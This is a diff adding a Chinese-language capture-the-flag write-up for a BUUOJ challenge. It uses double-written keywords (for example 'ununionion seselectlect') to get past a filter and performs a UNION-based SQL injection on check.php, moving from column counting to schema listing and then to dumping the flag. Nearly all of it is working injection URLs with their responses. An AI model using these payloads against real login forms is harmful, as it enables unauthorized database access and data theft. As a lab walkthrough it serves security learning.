@@ -1,0 +1,29 @@
+先进行双写注入判断列数：
+追加：/check.php?username=admin&password=1 %27 ununionion seselectlect 1 %23
+显示：The used SELECT statements have a different number of columns
+
+追加：/check.php?username=admin&password=1 %27 ununionion seselectlect 1,2,3 %23
+显示：Hello 2！
+Your password is '3'
+得知数据有三列
+
+追加：/check.php?username=admin&password=1 %27 ununionion seselectlect 1,2,database() %23
+显示：Hello 2！
+Your password is 'geek'
+得知其中一个数据库名为geek
+
+追加：http://d8960f2b-21dd-4aad-ae06-ea0730b19a6e.node4.buuoj.cn:81/check.php?username=admin&password=1 %27 ununionion seselectlect 1,2,group_concat(schema_name)frfromom (infoorrmation_schema.schemata) %23
+显示：Hello 2！
+Your password is 'information_schema,mysql,performance_schema,test,ctf,geek'
+得知有上面显示的6个库
+
+追加：http://d8960f2b-21dd-4aad-ae06-ea0730b19a6e.node4.buuoj.cn:81/check.php?username=admin&password=1%20%27%20ununionion%20seselectlect%201,2,group_concat(column_name)%20frfromom%20(infoorrmation_schema.columns)%20whwhereere%20table_name=%22Flag%22%20%23
+显示：Hello 2！
+Your password is 'flag'
+得知ctf库中数据表Flag中字段为flag
+
+追加：http://d8960f2b-21dd-4aad-ae06-ea0730b19a6e.node4.buuoj.cn:81/check.php?username=admin&password=1%20%27%20ununionion%20seselectlect%201,2,group_concat(flag)frfromom(ctf.Flag)%20%23
+Hello 2！
+Your password is 'flag{38fe35bd-2f40-4ce4-9e7d-703ee4ac8e1c}'
+得知flag字段值为flag{38fe35bd-2f40-4ce4-9e7d-703ee4ac8e1c}
+即flag：flag{38fe35bd-2f40-4ce4-9e7d-703ee4ac8e1c}
